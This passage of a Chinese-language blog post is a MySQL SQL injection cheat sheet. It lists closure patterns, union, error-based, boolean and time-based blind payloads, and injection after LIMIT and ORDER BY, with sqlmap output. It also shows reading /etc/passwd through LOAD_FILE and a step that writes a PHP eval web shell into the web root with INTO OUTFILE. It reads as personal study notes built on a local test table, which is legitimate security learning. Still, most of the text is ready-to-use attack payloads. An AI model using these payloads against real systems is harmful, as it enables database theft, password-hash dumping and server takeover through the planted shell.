的字符串。如果 str 大于 len，则返回值会缩减到 len 个字符</span><br><span class="line">RPAD(str,len,padstr)            #右补齐函数</span><br></pre></td></tr></table></figure>

<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">从&#x27;#&#x27;字符到行尾。</span><br><span class="line">从&#x27;--空格&#x27;序列到行尾。</span><br><span class="line">从/*序列到后面的*/序列。结束序列不一定在同一行中，因此该语法允许注释跨越多行。</span><br><span class="line">//, -- , /**/, #, --+, -- -, ;%00 , `</span><br></pre></td></tr></table></figure>

<h2 id="普通注入技术"><a href="#普通注入技术" class="headerlink" title="普通注入技术"></a>普通注入技术</h2><h3 id="注入基本流程"><a href="#注入基本流程" class="headerlink" title="注入基本流程"></a>注入基本流程</h3><ol>
<li>判断是数字型还是字符型参数</li>
<li>猜测语句，构造闭合</li>
<li>注入（报错注入、布尔&#x2F;时间盲注、联合查询注入、堆叠查询注入、内联查询注入）</li>
</ol>
<h3 id="常见sql注入位置"><a href="#常见sql注入位置" class="headerlink" title="常见sql注入位置"></a>常见sql注入位置</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. 常见GET、POST参数</span><br><span class="line">2. http头(X-Forwarded-For头、cookie)</span><br></pre></td></tr></table></figure>

<h3 id="常见语句格式"><a href="#常见语句格式" class="headerlink" title="常见语句格式"></a>常见语句格式</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">格式：               闭合：</span><br><span class="line">id=1                不需要</span><br><span class="line">id=&#x27;&#x27;               &#x27;#</span><br><span class="line">id=&quot;&quot;               &quot;#</span><br><span class="line">id=(&#x27;&#x27;)             &#x27;)--空格</span><br><span class="line">id=((&#x27;&#x27;))           &#x27;))/*</span><br></pre></td></tr></table></figure>

<h3 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h3><p>假设有: <a href="http://www.test.com/test.php?id=1">http://www.test.com/test.php?id=1</a></p>
<h4 id="数值型注入"><a href="#数值型注入" class="headerlink" title="数值型注入"></a>数值型注入</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test.php?id=1+1</span><br><span class="line">test.php?id=-1 or 1=1</span><br><span class="line">test.php?id=-1 or 10-2=8</span><br><span class="line">test.php?id=1 and 1=2</span><br><span class="line">test.php?id=1 and 1=1</span><br></pre></td></tr></table></figure>

<h4 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">参数被引号包围，我们需要闭合引号。</span><br><span class="line">test.php?id=1&#x27;</span><br><span class="line">test.php?id=1&quot;</span><br><span class="line">test.php?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">test.php?id=1&quot; and &quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure>
<h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询列数</span><br><span class="line">用UNION SELECT注入时，若后面要注出的数据的列与原数据列数不同，则会失败。所以需要先猜解列数。这里以3列为例子。</span><br><span class="line">UNION SELECT 1,2,3 #</span><br><span class="line">UNION ALL SELECT 1,2,3 #</span><br><span class="line">UNION ALL SELECT null,null,null #</span><br><span class="line"></span><br><span class="line">使用union注入：</span><br><span class="line">（1）猜表名</span><br><span class="line">exists(select * from tab_name)</span><br><span class="line">存在返回1，不存在则报错&gt; 1146 - Table &#x27;库名.表名&#x27; doesn&#x27;t exist</span><br><span class="line"></span><br><span class="line">（2）猜列数</span><br><span class="line">union select 1,2,3</span><br><span class="line"></span><br><span class="line">（3）猜列名</span><br><span class="line">exists(select col_name from tab_name)</span><br><span class="line">存在返回1，不存在则报错&gt; 1054 - Unknown column &#x27;列名&#x27; in &#x27;field list&#x27;</span><br><span class="line"></span><br><span class="line">（4）猜字段</span><br><span class="line">爆出显示位：</span><br><span class="line">union select 1,2,3,4,5 from tab_name;</span><br><span class="line">替换显示位：</span><br><span class="line">union select 1,2,col_name,4,5 from tab_name;</span><br><span class="line"></span><br><span class="line">利用二分法</span><br><span class="line">ORDER BY 10 #</span><br><span class="line">ORDER BY 5  #</span><br><span class="line">ORDER BY 2  #</span><br></pre></td></tr></table></figure>

<h3 id="常用通用爆库数据"><a href="#常用通用爆库数据" class="headerlink" title="常用通用爆库数据"></a>常用通用爆库数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select(col_name)from(tab_name)where(length(passwd))=len                                             #猜长度</span><br><span class="line">select group_concat(schema_name) from information_schema.schemata;                                  #MySQL &gt;= 5.0</span><br><span class="line">select distinct(db) from mysql.db                                                                   #需要特权</span><br><span class="line"></span><br><span class="line">select (group_concat(table_name)) from information_schema.tables where table_schema=database();     #当前库所有表名</span><br><span class="line">select (group_concat(column_name)) from information_schema.columns where (table_name=十六进制表名);  #一次爆出列名，十六进制表名要加0x，不用十六进制的时候，记得加单/双引号</span><br><span class="line">select column_name from information_schema.columns where table_name=十六进制表名 limit 0,1;          #爆列名，一条条来</span><br><span class="line">select 列名 from 表名;  </span><br><span class="line">select right(group_concat(列名),30) from 数据库名.表名                                                                             #爆记录</span><br><span class="line"></span><br><span class="line">备注：</span><br><span class="line">报错注入的话，用mysql.tab_name的形式，查询数据表</span><br></pre></td></tr></table></figure>

<h3 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.select Password from mysql.user where User=&#x27;root&#x27; limit 0,1;                      #查询root账户密码</span><br><span class="line">2.select authentication_string from mysql.user where User=&#x27;root&#x27; limit 0,1;			#查询root账户密码hash</span><br><span class="line">3.select table_name from information_schema.tables where table_schema=database();   #查询数据库的所有数据表</span><br><span class="line">4.update tab_name set col_name=val;                                                 #更新字段值</span><br><span class="line">5.insert into tab_name values(val1,val2);                                           #往tab_name表中插入一条字段1值为val1，字段2值为val2的记录</span><br><span class="line">6.delete from tab_name where col_name = val;                                        #删除一条字段为&quot;val&quot;的记录</span><br><span class="line">7.select count(*) from db_name.tab_name &gt;=1                                         #判断记录数是否大于等于1条</span><br><span class="line">8.select char_length((select id from apptest.answer limit 0,1))                     #判断记录长度</span><br><span class="line">9.show variables like &#x27;%char%&#x27;;                                                     #查看字符集</span><br><span class="line">10.show variables like &#x27;%secure%&#x27;;                                                   #查看可导出路径</span><br><span class="line"></span><br><span class="line">username=1&#x27;;show databases# 查看数据库名</span><br><span class="line"></span><br><span class="line">username=1&#x27;;show tables from english# 查看数据库中的表</span><br><span class="line"></span><br><span class="line">username=1&#x27;;show tables#</span><br><span class="line"></span><br><span class="line">username=1&#x27;;show columns from score# 查看表中的字段</span><br><span class="line">堆叠查询</span><br><span class="line">username=1&#x27;;set @sql=concat(&#x27;up&#x27;,&#x27;date `score` set listen=123 where username=&quot;火华&quot;&#x27;);prepare sql_exe FROM @sql;execute sql_exe#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="其他insert-update-delete注入"><a href="#其他insert-update-delete注入" class="headerlink" title="其他insert&#x2F;update&#x2F;delete注入"></a>其他insert&#x2F;update&#x2F;delete注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://xz.aliyun.com/t/2288</span><br><span class="line">https://www.anquanke.com/post/id/85487</span><br><span class="line">http://vinc.top/2017/04/06/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91insert%E3%80%81update%E5%92%8Cdelete%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</span><br><span class="line">http://wps2015.org/drops/drops/%E5%88%A9%E7%94%A8insert%EF%BC%8Cupdate%E5%92%8Cdelete%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html</span><br><span class="line">http://vinc.top/2017/04/06/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91insert%E3%80%81update%E5%92%8Cdelete%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</span><br><span class="line">等待补充</span><br><span class="line"></span><br><span class="line">创建测试环境数据库sectest：</span><br><span class="line">CREATE DATABASE sectest;</span><br><span class="line">创建测试数据表math1：</span><br><span class="line">CREATE TABLE IF NOT EXISTS math1 (</span><br><span class="line">    student_id VARCHAR(20) NOT NULL COMMENT &#x27;学号&#x27;,</span><br><span class="line">    student_name VARCHAR(50) NOT NULL COMMENT &#x27;姓名&#x27;,</span><br><span class="line">    score INT DEFAULT 0 COMMENT &#x27;数学分数&#x27;,</span><br><span class="line">    PRIMARY KEY (student_id) -- 以学号作为主键</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT=&#x27;数学成绩表（极简版）&#x27;;</span><br><span class="line">插入测试数据10条：</span><br><span class="line">-- 第1组数据</span><br><span class="line">INSERT INTO math1 (student_id, student_name, score) VALUES (&#x27;2025001&#x27;, &#x27;张三&#x27;, 98);</span><br><span class="line">-- 第2组数据</span><br><span class="line">INSERT INTO math1 (student_id, student_name, score) VALUES (&#x27;2025002&#x27;, &#x27;李四&#x27;, 125);</span><br><span class="line">-- 第3组数据</span><br><span class="line">INSERT INTO math1 (student_id, student_name, score) VALUES (&#x27;2025003&#x27;, &#x27;王五&#x27;, 76);</span><br><span class="line">-- 第4组数据</span><br><span class="line">INSERT INTO math1 (student_id, student_name, score) VALUES (&#x27;2025004&#x27;, &#x27;赵六&#x27;, 142);</span><br><span class="line">-- 第5组数据</span><br><span class="line">INSERT INTO math1 (student_id, student_name, score) VALUES (&#x27;2025005&#x27;, &#x27;孙七&#x27;, 59);</span><br><span class="line">-- 第6组数据</span><br><span class="line">INSERT INTO math1 (student_id, student_name, score) VALUES (&#x27;2025006&#x27;, &#x27;周八&#x27;, 0);</span><br><span class="line">-- 第7组数据</span><br><span class="line">INSERT INTO math1 (student_id, student_name, score) VALUES (&#x27;2025007&#x27;, &#x27;吴九&#x27;, 150);</span><br><span class="line">-- 第8组数据</span><br><span class="line">INSERT INTO math1 (student_id, student_name, score) VALUES (&#x27;2025008&#x27;, &#x27;郑十&#x27;, 88);</span><br><span class="line">-- 第9组数据</span><br><span class="line">INSERT INTO math1 (student_id, student_name, score) VALUES (&#x27;2025009&#x27;, &#x27;钱十一&#x27;, 110);</span><br><span class="line">-- 第10组数据</span><br><span class="line">INSERT INTO math1 (student_id, student_name, score) VALUES (&#x27;2025010&#x27;, &#x27;孙十二&#x27;, 67);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">#insert报错注入</span><br><span class="line">insert into math1 values (11,&#x27;name&#x27; xor updatexml(3,concat(0x7e,(version())),0) xor &#x27;&#x27;,123);</span><br><span class="line">insert into math1 values (23,&#x27;name&#x27;^updatexml(2,concat(0x7e,(version())),0)^&#x27;&#x27;,123);</span><br><span class="line">insert into math1 values (14,&#x27;name&#x27; or updatexml(2,concat(0x7e,(user())),0) or &#x27;&#x27;,123);</span><br><span class="line">insert into math1 values (14,&#x27;name&#x27; or updatexml(2,user(),0) or &#x27;&#x27;,123);</span><br><span class="line"></span><br><span class="line">#update报错注入</span><br><span class="line">update math1 set student_name = &#x27;test&#x27; and updatexml(2,concat(0x7e,(version())),0) and &#x27;&#x27;;</span><br><span class="line">update math1 set student_name = updatexml(2,concat(0x7e,(select concat_ws(0x7e, student_id, student_name)from(select * from math1) xx limit 0,1)),0)where student_id = &#x27;2025001&#x27;;</span><br><span class="line">#利用主键重复报错注入</span><br><span class="line">update math1 set student_name = ( select 1 from ( select count(*), concat( (select concat_ws(0x7e, student_id, student_name) from (select * from math1) xx limit 0,1), floor(rand(0)*2) ) x from information_schema.columns group by x ) a)where student_id = &#x27;2025001&#x27;;</span><br><span class="line"></span><br><span class="line">#delete报错注入</span><br><span class="line">delete from math1 where student_id = 2025001 or updatexml(2,concat(0x7e,(version())),0) or &#x27;&#x27;;</span><br><span class="line">delete from math1 where student_id = 2025001 or updatexml(2,concat(0x7e,(select user())),0);</span><br></pre></td></tr></table></figure>

<h3 id="使用load-file-读取文件"><a href="#使用load-file-读取文件" class="headerlink" title="使用load_file()读取文件"></a>使用load_file()读取文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">需要：</span><br><span class="line">1. 路径</span><br><span class="line">2. 文件名</span><br><span class="line">3. FILE权限</span><br><span class="line">4. 文件可读</span><br><span class="line">5. 目录可写，文件不能已存在</span><br><span class="line">6. 文件小于max_allowed_packet 字节</span><br><span class="line">#文件不满足上述条件，函数返回NUll</span><br><span class="line"></span><br><span class="line">判断:</span><br><span class="line">1. 必须有权限读取并且文件必须完全可读 </span><br><span class="line">and (select count(*) from mysql.user)&gt;0/* 如果结果返回正常,说明具有读写权限。</span><br><span class="line">and (select count(*) from mysql.user)&gt;0/* 返回错误，应该是管理员给数据库帐户降权了。</span><br><span class="line">2. 被读取文件必须在服务器上 </span><br><span class="line">3. 必须指定文件完整的路径 </span><br><span class="line">4. 欲读取文件必须小于 max_allowed_packet </span><br><span class="line"></span><br><span class="line">#读取 Linux 系统的 /etc/passwd 文件（系统用户信息文件，常作为测试目标）</span><br><span class="line">SELECT LOAD_FILE(&#x27;/etc/passwd&#x27;);</span><br><span class="line"></span><br><span class="line">#读取 Windows 系统的 C:\Windows\system32\drivers\etc\hosts 文件（主机映射文件）</span><br><span class="line">SELECT LOAD_FILE(&#x27;C:\\Windows\\system32\\drivers\\etc\\hosts&#x27;); -- 注意：Windows 路径需用双反斜杠转义，或用正斜杠</span><br><span class="line">#等价写法（正斜杠）：</span><br><span class="line">SELECT LOAD_FILE(&#x27;C:/Windows/system32/drivers/etc/hosts&#x27;);</span><br><span class="line"></span><br><span class="line">#读取自定义文本文件</span><br><span class="line">SELECT LOAD_FILE(&#x27;/tmp/test.txt&#x27;);</span><br><span class="line"></span><br><span class="line">#获取hex编码后的文件内容</span><br><span class="line">SELECT hex(LOAD_FILE(&#x27;d:\\phpstudy_pro\\www\\flag.txt&#x27;));</span><br><span class="line"></span><br><span class="line">编码处理：</span><br><span class="line">#ASCII码</span><br><span class="line">SELECT LOAD_FILE(CHAR(67,58,92,92,84,69,83,84,46,116,120,116))</span><br><span class="line">#16进制</span><br><span class="line">SELECT LOAD_FILE(0x433a5c5c544553542e747874)</span><br><span class="line"></span><br><span class="line">排错：</span><br><span class="line">#1. 查看 secure-file-priv 配置</span><br><span class="line">SHOW VARIABLES LIKE &#x27;secure_file_priv&#x27;;</span><br><span class="line">#2. 查看 FILE 权限</span><br><span class="line">SHOW GRANTS FOR CURRENT_USER();</span><br><span class="line">#3. 检查文件路径是否正确（可通过 MySQL 服务器执行 `ls /etc/passwd` 或 `dir C:\Windows\system32\drivers\etc\hosts` 验证）</span><br></pre></td></tr></table></figure>
<h3 id="使用into-outfile写文件"><a href="#使用into-outfile写文件" class="headerlink" title="使用into outfile写文件"></a>使用into outfile写文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#写入小马testshell.php</span><br><span class="line">union select &#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;  into outfile &#x27;D:\\phpstudy_pro\\WWW\\testshell.php&#x27;;</span><br><span class="line">#写查询结果入文件flag.txt</span><br><span class="line">union select database() into outfile &#x27;d:\\phpstudy_pro\\www\\flag.txt&#x27;;</span><br></pre></td></tr></table></figure>
<h2 id="高级注入技术（limit，order，二次注入）"><a href="#高级注入技术（limit，order，二次注入）" class="headerlink" title="高级注入技术（limit，order，二次注入）"></a>高级注入技术（limit，order，二次注入）</h2><h3 id="limit后面注入"><a href="#limit后面注入" class="headerlink" title="limit后面注入"></a>limit后面注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">支持报错payload:</span><br><span class="line">procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br><span class="line"></span><br><span class="line">不支持报错payload：</span><br><span class="line">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</span><br><span class="line"></span><br><span class="line">select BENCHMARK(40000000,SHA1(1));</span><br><span class="line"></span><br><span class="line">本机跑14s：</span><br><span class="line">select BENCHMARK(50000000,SHA1(1));</span><br><span class="line"></span><br><span class="line">limit后的注入，使用analyse()只能5.0.0&lt;mysql&lt;5.6.6的版本</span><br><span class="line">http://vinc.top/2016/06/20/mysql-order-by-%E5%90%8E%E6%B3%A8%E5%85%A5/</span><br><span class="line">https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html</span><br><span class="line">http://www.freebuf.com/articles/web/57528.html</span><br><span class="line">http://vinc.top/2017/04/01/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91mysql-limit-%E6%B3%A8%E5%85%A5/	(good)</span><br><span class="line">https://rdot.org/forum/showpost.php?p=36186&amp;postcount=30</span><br></pre></td></tr></table></figure>
<h3 id="order-by后面注入"><a href="#order-by后面注入" class="headerlink" title="order by后面注入"></a>order by后面注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xdxd.love/2016/03/07/order-by%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/</span><br><span class="line">判断是否存在注入：</span><br><span class="line">id+asc</span><br><span class="line">id+desc</span><br><span class="line">order by盲注:</span><br><span class="line">http://wonderkun.cc/index.html/?p=547</span><br></pre></td></tr></table></figure>
<p>盲注：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">需要知道字段名</span><br><span class="line">1，使用 if(1&lt;2,id,domain)或者类似的表达式来布尔盲注或者时间盲注。</span><br><span class="line"></span><br><span class="line">(select case when (true) then id else price end)</span><br><span class="line"></span><br><span class="line">if((selectchar(substring(table_name,1,1)) from information_schema.tables limit 1)&lt;=128),id,price)</span><br><span class="line">条件判断之后选择的字段名，id，domain，不能是1，2，所以一定要知道字段名。猜测是写1，2的话被判断为字符了。</span><br><span class="line"></span><br><span class="line">1,基于表达式结果盲注</span><br><span class="line"></span><br><span class="line">案例：http://www.wooyun.org/bugs/wooyun-2010-07406</span><br><span class="line"></span><br><span class="line">不过以上的这些技巧都需要一些条件，目前看来order by注入跟where条件注入具有同样的布尔盲注和时间注入的方式，利用方式也比较成熟。所以这些技巧只能用来开阔思路了。</span><br><span class="line"></span><br><span class="line">成熟的利用方式</span><br><span class="line">基于order by 1,2 时间盲注：</span><br><span class="line">payload:</span><br><span class="line"></span><br><span class="line">asc,if(locate(\&#x27;&#x27;+payload+&#x27;\&#x27;,substring(user(),&#x27;+str(i)+&#x27;,1)),sleep(3),1)</span><br><span class="line">基于order by 1,2 引起mysql错误进行盲注</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line"></span><br><span class="line">id,if(1=1,1,(select 1 from information_schema.tables))</span><br><span class="line">当条件为false是，值为select 1 from information_schema.tables，mysql会报错，Subquery returns more than 1 row，导致查询结果为空。</span><br><span class="line"></span><br><span class="line">案例：http://www.wooyun.org/bugs/wooyun-2010-076151</span><br><span class="line"></span><br><span class="line">基于 order by rand(true);order by rand(false);返回不同进行盲注</span><br><span class="line">payload:rand(ascii(mid(database(),1,1))=109)</span><br><span class="line"></span><br><span class="line">案例：http://www.wooyun.org/bugs/wooyun-2010-0152570</span><br><span class="line"></span><br><span class="line">关于order by rand(true)和order by rand(false)返回不同的培训原理是 order by rand()会随机给每个数据生成一个随机数，然后按照随机数培训，true和false实际上转成了整形的1和0作为rand()的种子，这样给每一列都会成一个固定的数，然后根据这个数来排序，所以结果会不同。</span><br><span class="line"></span><br><span class="line">参考这里的讨论：http://zone.wooyun.org/content/25733</span><br><span class="line"></span><br><span class="line">sqlmap利用方式</span><br><span class="line">使用level5 risk3</span><br><span class="line"></span><br><span class="line">Parameter: sort (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</span><br><span class="line">    Payload: sort=1 RLIKE (SELECT (CASE WHEN (9644=9644) THEN 1 ELSE 0x28 END))</span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT)</span><br><span class="line">    Payload: sort=1 AND (SELECT * FROM (SELECT(SLEEP(5)))MVan)</span><br></pre></td></tr></table></figure>
<h3 id="有回显位的SQL注入："><a href="#有回显位的SQL注入：" class="headerlink" title="有回显位的SQL注入："></a>有回显位的SQL注入：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">判断列数：</span><br><span class="line">order by num</span><br><span class="line"></span><br><span class="line">limit后可以利用：</span><br><span class="line">limit 1 into @,@    #（@为字段数）判断字段数@为mysql临时变量,这是两列的例子</span><br><span class="line"></span><br><span class="line">其他参考通用</span><br></pre></td></tr></table></figure>
<h3 id="无回显位但是有报错提示的："><a href="#无回显位但是有报错提示的：" class="headerlink" title="无回显位但是有报错提示的："></a>无回显位但是有报错提示的：</h3><h4 id="xpath报错注入-mysql-5-1-5，order-by后也可用-："><a href="#xpath报错注入-mysql-5-1-5，order-by后也可用-：" class="headerlink" title="xpath报错注入(mysql&gt;&#x3D;5.1.5，order by后也可用)："></a>xpath报错注入(mysql&gt;&#x3D;5.1.5，order by后也可用)：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(可获取31个字符)</span><br><span class="line">updatexml(1,concat(0x7e,(select/**/user()),0x7e),1)--+</span><br><span class="line">1&#x27;and updatexml(1,concat(0x7e,database(),0x7e),1)--+</span><br><span class="line">extractvalue(1,concat(0x24,(select/**/user())))</span><br></pre></td></tr></table></figure>
<h4 id="floor主键重复报错："><a href="#floor主键重复报错：" class="headerlink" title="floor主键重复报错："></a>floor主键重复报错：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line">and (select count(*) from (select 1 union select null union select  !1)x group by concat((select user()),floor(rand(0)*2)));</span><br><span class="line"></span><br><span class="line">NAME_CONST列名重复报错(MySQL 5.0.12加入):</span><br><span class="line">and exists(select*from (select*from(select name_const(@@version,0))a join (select name_const(@@version,0))b)c)</span><br><span class="line">and exists(select*from (select*from(select name_const((select concat(user,password) from mysql.user limit 0,1),0))a join (select name_const((select concat(user,password) from mysql.user limit 0,1),0))b)c)</span><br></pre></td></tr></table></figure>
<h4 id="join报错注入："><a href="#join报错注入：" class="headerlink" title="join报错注入："></a>join报错注入：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">下面以爆mysql.user表为例爆字段名的过程：</span><br><span class="line">（1）爆第一个列名</span><br><span class="line">union select * from(select * from mysql.user a join mysql.user b)c;</span><br><span class="line">（2）爆第二个列名（使用using）</span><br><span class="line">union select * from(select * from mysql.user a join mysql.user b using(Host))c;</span><br><span class="line">（3）爆第三列名（还是使用using，参数是前两个列的列名）</span><br><span class="line">union select * from(select * from mysql.user a join mysql.user b using(Host,User))c;</span><br><span class="line">依次类推，只要修改语句的using即可。</span><br><span class="line">爆数据</span><br><span class="line">union select * from(select * from math1 a join math1 b using(id,name))c</span><br></pre></td></tr></table></figure>
<h4 id="BIGINT等数据类型溢出报错（mysql"><a href="#BIGINT等数据类型溢出报错（mysql" class="headerlink" title="BIGINT等数据类型溢出报错（mysql&lt;5.5.53可用，且报错信息长度有限）："></a>BIGINT等数据类型溢出报错（mysql&lt;5.5.53可用，且报错信息长度有限）：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select exp(~(select*from(select user())x));</span><br><span class="line">select !(select*from(select user())x)-~0;</span><br><span class="line">类推：</span><br><span class="line">select !hex((select*from(select user())x))-~0;</span><br><span class="line">select !ceil((select*from(select user())x))-~0;</span><br><span class="line">select !atan((select*from(select user())x))-~0;</span><br><span class="line">select !rand((select*from(select user())a))-~0;</span><br><span class="line">select !sqrt((select*from(select user())a))-~0;</span><br><span class="line">select !round((select*from(select user())a))-~0;</span><br><span class="line">select !sign((select*from(select user())a))-~0;</span><br><span class="line">select !floor((select*from(select user())a))-~0;</span><br><span class="line">select !tan((select*from(select user())a))-~0;</span><br><span class="line">select !ceiling((select*from(select user())a))-~0;</span><br><span class="line">select !exp((select*from(select user())x))-~0;</span><br><span class="line">select !(select*from(select user())a)-~1^200;</span><br></pre></td></tr></table></figure>
<h4 id="其他报错"><a href="#其他报错" class="headerlink" title="其他报错"></a>其他报错</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">polygon、multipoint、multilinestring、multipolygon、linestring</span><br><span class="line"></span><br><span class="line">得到库名：</span><br><span class="line">payload:</span><br><span class="line">select * from math1 where id=1 union select 1 from flag;</span><br><span class="line">ERROR 1146 (42S02): Table &#x27;myclass.flag&#x27; doesn&#x27;t exist</span><br><span class="line"></span><br><span class="line">得到表名：</span><br><span class="line">payload:</span><br><span class="line">select * from math1 where id=0 and linestring(id)</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &#x27;`myclass`.`math1`.`id`&#x27; value found during parsing</span><br></pre></td></tr></table></figure>
<h3 id="有显示但是无回显位的："><a href="#有显示但是无回显位的：" class="headerlink" title="有显示但是无回显位的："></a>有显示但是无回显位的：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(就是查询正确和查询错误页面返回结果不一致的)</span><br><span class="line">此类一般用盲注：</span><br><span class="line">payload:</span><br><span class="line">and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&gt;50)-- </span><br></pre></td></tr></table></figure>
<h3 id="无显示无回显的-时间盲注-："><a href="#无显示无回显的-时间盲注-：" class="headerlink" title="无显示无回显的(时间盲注)："></a>无显示无回显的(时间盲注)：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&gt;50,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="盲注场景："><a href="#盲注场景：" class="headerlink" title="盲注场景："></a>盲注场景：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.通过前面的测试会发现页面没有回显提取的数据，但是根据语句是否执行成功与否会有一些相应的变化。</span><br><span class="line">2.正确/错误的语句使得页面有适度的变化。可以尝试使用布尔注入</span><br><span class="line">3.正确语句返回正常页面，错误的语句返回通用错误页面。可以尝试使用布尔注入。</span><br><span class="line">4.提交错误语句，不影响页面的正常输出。建议尝试使用延时注入。</span><br><span class="line"></span><br><span class="line">几种简单的判断语句，在真实利用中需要根据情况而变化:</span><br><span class="line">CASE</span><br><span class="line">IF()</span><br><span class="line">IFNULL()</span><br><span class="line">NULLIF()</span><br></pre></td></tr></table></figure>
<h4 id="布尔盲注-基于响应"><a href="#布尔盲注-基于响应" class="headerlink" title="布尔盲注-基于响应"></a>布尔盲注-基于响应</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">提交一个逻辑判断语句，来推断一个个的信息位。由于注入需要（一般）一个个字符的进行，所以需要利用脚本，或者工具（比如burp suite）。以下是：</span><br><span class="line">payload:</span><br><span class="line">// i 用于提取每一个位，j 用于判断其对应的ASCII码值的范围。</span><br><span class="line">// k ，结合limit，选择偏移为k的行</span><br><span class="line">// **中可以填上其他的select语句，比如查询表名，列名，数据。一次类推。</span><br><span class="line">// SUBSTR() 也可以换成 SUBSTRING()</span><br><span class="line">&#x27; OR (SELECT ASCII(SUBSTR(DATABASE(),i,1) ) &lt; j) #</span><br><span class="line">&#x27; OR (SELECT ASCII(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) ) &lt; j) #  </span><br><span class="line">&#x27; OR (SELECT SUBSTR(DATABASE(),i,1) &lt; j) #</span><br><span class="line">&#x27; OR (SELECT SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j) #  </span><br><span class="line">&#x27; OR SUBSTR((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT k,1),i,1) &lt; j #</span><br><span class="line">sqlmap的payload：</span><br><span class="line">//猜解表个数：</span><br><span class="line">2&#x27; AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x7365637572697479),1,1))&gt;51 AND &#x27;VgnR&#x27;=&#x27;VgnR</span><br><span class="line">//猜解表名：</span><br><span class="line">2&#x27; AND ORD(MID((SELECT IFNULL(CAST(table_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x7365637572697479 LIMIT 0,1),3,1))&gt;98 AND &#x27;EtEm&#x27;=&#x27;EtEm</span><br></pre></td></tr></table></figure>
